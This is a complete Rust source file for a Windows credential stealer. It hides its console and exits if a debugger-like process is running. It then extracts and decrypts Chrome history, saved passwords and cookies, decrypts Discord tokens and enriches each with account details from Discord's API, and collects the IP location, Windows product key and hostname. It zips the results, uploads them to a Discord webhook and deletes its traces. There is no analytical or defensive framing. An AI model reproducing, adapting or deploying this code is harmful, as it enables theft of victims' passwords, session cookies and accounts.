#![windows_subsystem = "windows"]
use std::{io::BufWriter, fs::File, io::ErrorKind, fs::create_dir, os::windows::process::CommandExt, collections::HashSet, fs::OpenOptions, fs::remove_dir_all, ptr::null_mut, fs::read, fs::write, process::Command, fs::read_dir, fs::copy, slice::from_raw_parts, path::Path, env::var, process::exit, io::Write};
use aes_gcm::{
    aead::{Aead, KeyInit, Payload},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use regex::Regex;
use serde_json::Value;
use winapi::um::{dpapi::CryptUnprotectData, wincrypt::CRYPTOAPI_BLOB};
use rusqlite::Connection;
use reqwest::blocking::multipart::{Form, Part};
use reqwest::{blocking::Client, header};
use zip::ZipWriter;

fn main() {
    let adout: String = ad();
    if adout != "" {
        exit(0);
    }

    let spacer = "=".repeat(50);
    let user = var("USERNAME").expect("Failed to get USERNAME");
    let base_dir = format!("C:/Users/{}/AppData/Local/Temp/", &user);
    let crat_dir = create_dir(format!("{}tmpv54g6jg6/", base_dir));
    let mut tmp_dir = String::new();
    match crat_dir {
        Ok(()) =>  tmp_dir = format!("{}tmpv54g6jg6/", base_dir),
        Err(e) if e.kind() == ErrorKind::AlreadyExists => {
            print!("{}", e);
            let _ =create_dir(format!("{}tmpncd49pkt/", base_dir));
            tmp_dir = format!("{}tmpncd49pkt/", base_dir);
        },
        Err(_) => exit(0),
    };


    history(spacer.clone(), &tmp_dir);
    passwords(&spacer, &tmp_dir);
    cookies(spacer.clone(), &tmp_dir);
    let vec_tkn = token();
    let _ = function(spacer, vec_tkn, tmp_dir);
}


fn function(spacer: String, vec_tkn: Vec<String>, tmp_dir: String) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = OpenOptions::new()
    .append(true)
    .create(true)
    .open(format!("{}info.txt", &tmp_dir))?;
    for tkn in &vec_tkn {
        let client = reqwest::blocking::Client::new();
        let response = client
            .get("https://discord.com/api/v9/users/@me")
            .header(header::USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
            .header(header::CONTENT_TYPE, "application/json")
            .header(header::AUTHORIZATION, tkn)
            .send()?;
        if response.status().is_success() {
            let json: Value = serde_json::from_str(&response.text()?).unwrap();
            let nitro_value = json["premium_type"].as_u64().unwrap_or_default();
            let nitro: &str;
            if nitro_value == 0 {
                nitro = "None";
            } else if nitro_value == 1 {
                nitro = "Nitro Classic";
            } else if nitro_value == 2{
                nitro = "Nitro Boost";
            } else {
                nitro = "Nitro Basic";
            }
            let account = format!("{}#{}", json["username"].as_str().unwrap_or_default(), json["discriminator"].as_str().unwrap_or_default());
            let iddis = json["id"].as_str().unwrap_or_default();
            let email = json["email"].as_str().unwrap_or_default();
            let mut phone = json["phone"].as_str().unwrap_or_default();
            if phone.is_empty(){    
                phone = "None";
            }
            let mut bio = json["bio"].as_str().unwrap_or_default();
            if bio.is_empty(){    
                bio = "None";
            }
            let locale = json["locale"].as_str().unwrap_or_default();
            let mut mfa_enabled  = json["mfa_enabled"].as_str().unwrap_or_default();
            if mfa_enabled.is_empty(){    
                mfa_enabled = "MFA disabled";
            }
            let mut verified  = json["verified"].as_str().unwrap_or_default();
            if verified.is_empty(){    
                verified = "Not verified";
            }
            let mut nsfw_enabled = json["nsfw_allowed"].as_str().unwrap_or_default();
            if nsfw_enabled.is_empty(){    
                nsfw_enabled = "NSFW disabled";
            }
            file.write_all(format!("                {}\n", account).as_bytes())?;
            file.write_all(format!("{}\n", spacer).as_bytes())?;
            file.write_all(format!("Token: {}\n", tkn).as_bytes())?;
            file.write_all(format!("ID: {}\n", iddis).as_bytes())?; 
            file.write_all(format!("Email: {}\n", email).as_bytes())?;
            file.write_all(format!("Phone: {}\n", phone).as_bytes())?;
            file.write_all(format!("Bio: {}\n", bio).as_bytes())?;
            file.write_all(format!("Language: {}\n", locale).as_bytes())?;
            file.write_all(format!("MFA: {}\n", mfa_enabled).as_bytes())?;
            file.write_all(format!("Verified: {}\n", verified).as_bytes())?;
            file.write_all(format!("NSFW: {}\n", nsfw_enabled).as_bytes())?;
            file.write_all(format!("Nitro: {}\n\n\n", nitro).as_bytes())?;
        }
    }  


    let client = Client::new();
    let response = client
        .get("https://ipinfo.io/json")
        .send()?;
    if response.status().is_success() {
        let json: Value = serde_json::from_str(&response.text()?).unwrap();
        let ip = json["ip"].as_str().unwrap_or_default();
        let city = json["city"].as_str().unwrap_or_default();
        let country  = json["country"].as_str().unwrap_or_default();
        let region = json["region"].as_str().unwrap_or_default();
        let org = json["org"].as_str().unwrap_or_default();
        let loc = json["loc"].as_str().unwrap_or_default();
        let googlemap  = format!("https://www.google.com/maps/search/google+map++, {}", loc);

        file.write_all(format!("                {}\n", ip).as_bytes())?;
        file.write_all(format!("{}\n", spacer).as_bytes())?;
        file.write_all(format!("City: {}\n", city).as_bytes())?;
        file.write_all(format!("Country: {}\n", country).as_bytes())?; 
        file.write_all(format!("Region: {}\n", region).as_bytes())?;
        file.write_all(format!("Organization: {}\n", org).as_bytes())?;
        file.write_all(format!("Location: {}\n", loc).as_bytes())?;
        file.write_all(format!("Google Map: {}\n\n\n", googlemap).as_bytes())?;
        file.write_all(("                System Info\n").as_bytes())?;
        file.write_all(format!("{}\n", spacer).as_bytes())?;
    }

    file.write_all(format!("Product Key: {}\n", productkey()).as_bytes())?;
    file.write_all(format!("Windows Version: {}\n", osv()).as_bytes())?;

    let hostnames = hostname();
    let output_file = File::create(format!("{}{}.zip", &tmp_dir, hostnames)).unwrap();
    let mut zip_writer = ZipWriter::new(BufWriter::new(output_file));
    zip_writer
        .start_file("info.txt", Default::default())
        .unwrap();
    std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}info.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
    zip_writer
        .start_file("History.txt", Default::default())
        .unwrap();
    std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}History.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
    zip_writer
        .start_file("Passwords.txt", Default::default())
        .unwrap();
    std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}Passwords.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
    zip_writer
        .start_file("Cookies.txt", Default::default())
        .unwrap();
    std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}Cookies.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
    zip_writer.finish().unwrap();
    
    let webhook_url = "Your_Discord_Webhook";
    let file_path = format!("{}{}.zip", &tmp_dir, hostnames);
    let file_name = format!("{}.zip", hostnames);
    let file_contents = read(file_path)?;
    let file_part = Part::bytes(file_contents)
        .file_name(file_name)
        .mime_str("text/html")?;
    let form = Form::new().part("file", file_part);


    let client = Client::new();
    client.post(webhook_url).multipart(form).send()?;

    let _ = remove_dir_all(&tmp_dir);

    Ok(())
}   
fn token() -> Vec<String> {
    let files =
    read_dir(var("APPDATA").unwrap() + "\\discord\\Local Storage\\leveldb")
        .unwrap();

    let re = Regex::new(r#"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\"]*"#).unwrap();

    let key = getkey(format!("C://Users//{}//AppData//Roaming//discord//Local State", var("USERNAME").expect("Failed to get USERNAME")));

    let mut tkns: HashSet<String> = HashSet::new();

    for file in files {
        match file {
            Ok(file) => {
                let fname = file.file_name().to_str().unwrap().to_owned();

                if [".log", ".ldb"].iter().any(|&ext| fname.ends_with(ext)) {
                    match read(file.path().display().to_string()) {
                        Ok(out) => {
                            for tkn in re.find_iter(
                                String::from_utf8_lossy(out.as_slice()).to_string().as_str(),
                            ) {
                                match general_purpose::STANDARD.decode(
                                    tkn.as_str().split("dQw4w9WgXcQ:").collect::<Vec<_>>()[1],
                                ) {
                                    Ok(tkn) => tkns.insert(decrypt(&tkn, &key)),
                                    Err(_) => continue,
                                };
                            }
                        }
                        Err(_) => continue,
                    }
                }
            }
            Err(_) => continue,
        }
    }
    return tkns.into_iter().collect()
}
fn decrypt(bytes: &Vec<u8>, key: &Vec<u8>) -> String {
    let aes = Aes256Gcm::new_from_slice(key.as_slice()).unwrap();

    let iv = Nonce::from_slice(&bytes[3..15]);

    let ciphertext = Payload::from(&bytes[15..]);

    let decrypted = aes.decrypt(iv, ciphertext).unwrap();

    String::from_utf8(decrypted).unwrap()
}
fn getkey(path: String) -> Vec<u8> {
    let content = std::fs::read_to_string(path).unwrap();
    let contenttojson: Value = serde_json::from_str(content.as_str()).unwrap();
    let cryptedkey = contenttojson["os_crypt"]["encrypted_key"].to_string();
    let mut rawkey = general_purpose::STANDARD
        .decode(&cryptedkey[1..cryptedkey.len() - 1])
        .unwrap();
    rawkey = rawkey[5..].to_vec();
    let mut p_data_in = CRYPTOAPI_BLOB {
        cbData: rawkey.len() as u32,
        pbData: rawkey.as_mut_ptr(),
    };
    let mut p_data_out = CRYPTOAPI_BLOB {
        cbData: rawkey.len() as u32,
        pbData: rawkey.as_mut_ptr(),
    };
    let pin = &mut p_data_in;
    let pout = &mut p_data_out;

    unsafe {
        let _result =
            CryptUnprotectData(pin, null_mut(), null_mut(), null_mut(), null_mut(), 0, pout);

        from_raw_parts(p_data_out.pbData, p_data_out.cbData as _).to_vec()
    }
}
fn productkey() -> String {
    let output = Command::new("powershell")
        .args(&[
            "Get-ItemProperty",
            "-Path",
            "'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform'",
            "-Name",
            "BackupProductKeyDefault",
            "|",
            "Select-Object",
            "-ExpandProperty",
            "BackupProductKeyDefault",
        ])
        .creation_flags(0x08000000)
        .output()
        .expect("");
    
    if output.status.success() {
        let key = String::from_utf8(output.stdout).unwrap().trim().to_string();
        return key;
    } else {
        let error = "".to_string();
        return error;
    }
}
fn hostname() -> String {
    let output = Command::new("powershell")
        .args(&[
            "hostname",
        ])
        .creation_flags(0x08000000)
        .output()
        .expect("");
    
    if output.status.success() {
        let key = format!("{}", String::from_utf8(output.stdout).unwrap().trim().to_string());
        return key;
    } else {
        let error = "unknowen".to_string();
        return error;
    }
}
fn osv() -> String {
    let output = Command::new("powershell")
        .args(&[
            "Get-ComputerInfo",
            " | ",
            "Select-Object ",
            "-ExpandProperty ",
            "'WindowsProductName'",
        ])
        .creation_flags(0x08000000)
        .output()
        .expect("");
    
    if output.status.success() {
        let key = format!("{}", String::from_utf8(output.stdout).unwrap().trim().to_string());
        return key;
    } else {
        let error = "Could not capture OS version".to_string();
        return error;
    }
}
fn ad() -> String {
    let output = Command::new("powershell")
    .args(&[
        "tasklist",
        "|",
        " findstr ",
        " /I ",
        "'Dbg'",
    ])
    .creation_flags(0x08000000)
    .output()
    .expect("");
let key = String::from_utf8(output.stdout).unwrap().trim().to_string();
if output.status.success() {
    return key;
} else {
    let error = format!("{}", key).to_string();
    return error;
}
}
fn history(spacer: String, tmp_dir: &String) {
    let chrome_history = format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", var("USERNAME").expect("Failed to get USERNAME"));
    let check_path = Path::new(&chrome_history);
    if !check_path.exists() {
        return;
    }
    let tmp_history = format!("{}History", &tmp_dir);
    let _ = copy(chrome_history, &tmp_history);
    if !Path::new(tmp_history.as_str()).is_file() {
        return;
    }
    let conn = match Connection::open(tmp_history) {
        Ok(conn) => {
            conn
        }
        Err(_) => return,
    };
    let mut response =
        match conn.prepare("SELECT title, url, last_visit_time FROM urls") {
            Ok(statement) => statement,
            Err(_) => return
        };

    let iter = match response.query_map([], |row| {
        Ok([
            match row.get::<usize, String>(0) {
                Ok(res) => res,
                Err(_) => "\"\"".to_string(),
            },
            match row.get::<usize, String>(1) {
                Ok(res) => res,
                Err(_) => "\"\"".to_string(),
            },
            match row.get::<usize, usize>(2) {
                Ok(res) => res.to_string(),
                Err(_) => "\"\"".to_string(),
            },
            match row.get::<usize, usize>(2) {
                Ok(res) => res.to_string(),
                Err(_) => "\"\"".to_string(),
            },
        ])
    }) {
        Ok(suc) => suc,
        Err(_) => return,
    };
    let mut dastuff = iter
        .map(|i| match i {
            Ok(i) => {
                        format!("{}", i[0]) 
            }
            Err(_) => "\"\"".to_string(),
        })
        .collect::<Vec<String>>()
        .join("\n\n");
    dastuff = format!("URL\n\n{}\n\n", spacer.repeat(3)).to_owned() + &dastuff;
    write(format!("{}History.txt", &tmp_dir), dastuff).unwrap();
    return
}
fn passwords(spacer: &String, tmp_dir: &String) {
    let chrome_history = format!("C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data", var("USERNAME").expect("Failed to get USERNAME"));
    let check_path = Path::new(&chrome_history);
    if !check_path.exists() {
        return;
    }
    let tmp_history = format!("{}Login Data", &tmp_dir);
    let _ = copy(chrome_history, &tmp_history);
    if !Path::new(tmp_history.as_str()).is_file() {
        return;
    }
    let conn = match Connection::open(tmp_history) {
        Ok(conn) => {
            conn
        }
        Err(_) => {
        return
    },
    };
    let mut response =
        match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
            Ok(statement) => statement,
            Err(_) => {
                return;
            }
        };
    let master_key_bytes = getkey(format!("C:\\Users\\hoey\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"));
    let iter = match response.query_map([], |row| {
        Ok([
            match row.get::<usize, String>(0) {
                Ok(res) => res,
                Err(_) => "\"\"".to_string(),
            },
            match row.get::<usize, String>(1) {
                Ok(res) => res,
                Err(_) => "\"\"".to_string(),
            },
            match row.get::<usize, Vec<u8>>(2) {
                Ok(res) => decrypt(&res, &master_key_bytes),
                Err(_) => "\"\"".to_string(),
            },
        ])
    }) {
        Ok(suc) => suc,
        Err(_) => return,
    };
    let mut dastuff = iter
        .map(|i| match i {
            Ok(i) => {
                format!("{}\t\t\t\t\t  {}\t\t           {}\t\t", i[0], i[1], i[2])
            }
            Err(_) => "\"\"".to_string(),
        })
        .collect::<Vec<String>>()
        .join("\n\n");
    dastuff = format!("\t\tURL\t\t\t\t\t         Username\t\t    Password\n{}\n\n", spacer.repeat(3)).to_owned() + &dastuff;
    write(format!("{}Passwords.txt", &tmp_dir), dastuff).unwrap();
    return
}
fn cookies(spacer: String, tmp_dir: &String) {
    let chrome_history = format!("C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies", var("USERNAME").expect("Failed to get USERNAME"));
    let check_path = Path::new(&chrome_history);
    if !check_path.exists() {
        return;
    }
    let tmp_history = format!("{}Login Data", &tmp_dir);
    let _ = copy(chrome_history, &tmp_history);
    if !Path::new(tmp_history.as_str()).is_file() {
        return;
    }
    let conn = match Connection::open(tmp_history) {
        Ok(conn) => {
            conn
        }
        Err(_) => {
        return
    },
    };
    let mut response =
        match conn.prepare("SELECT * FROM Cookies;") {
            Ok(statement) => statement,
            Err(_) => {
                return;
            }
        };
    let master_key_bytes = getkey(format!("C:\\Users\\hoey\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"));
    let iter = match response.query_map([], |row| {
        Ok([
            match row.get::<usize, Vec<u8>>(0) {
                Ok(res) => decrypt(&res, &master_key_bytes),
                Err(_) => "\"\"".to_string(),
            },
            match row.get::<usize, String>(1) {
                Ok(res) => res,
                Err(_) => "\"\"".to_string(),
            },
        ])
    }) {
        Ok(suc) => suc,
        Err(_) => return,
    };
    let mut dastuff = iter
        .map(|i| match i {
            Ok(i) => {
                format!("{}\t\t\t\t\t\t{}", i[0], i[1])
            }
            Err(_) => "\"\"".to_string(),
        })
        .collect::<Vec<String>>()
        .join("\n\n");
    dastuff = format!("\t\tCookies\n{}\n\n", spacer.repeat(3)).to_owned() + &dastuff;
    write(format!("{}Cookies.txt", &tmp_dir), dastuff).unwrap();
    return
}